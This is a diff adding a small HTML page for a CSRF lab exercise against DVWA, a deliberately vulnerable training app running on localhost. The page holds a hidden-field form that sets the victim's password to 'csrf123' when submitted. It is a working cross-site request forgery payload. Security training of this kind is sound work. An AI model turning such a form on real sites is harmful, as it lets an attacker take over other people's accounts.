@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF External Test</title>
+</head>
+<body>
+    <h2>DVWA CSRF 模拟跨站请求实验</h2>
+    <form
+        action="http://127.0.0.1:8080/vulnerabilities/csrf/"
+        method="GET"
+    >
+        <input
+            type="hidden"
+            name="password_new"
+            value="csrf123"
+        >
+
+        <input
+            type="hidden"
+            name="password_conf"
+            value="csrf123"
+        >
+        <input
+            type="hidden"
+            name="Change"
+            value="Change"
+        >
+        <button type="submit">
+            发送测试请求
+        </button>
+    </form>
+</body>
+</html>
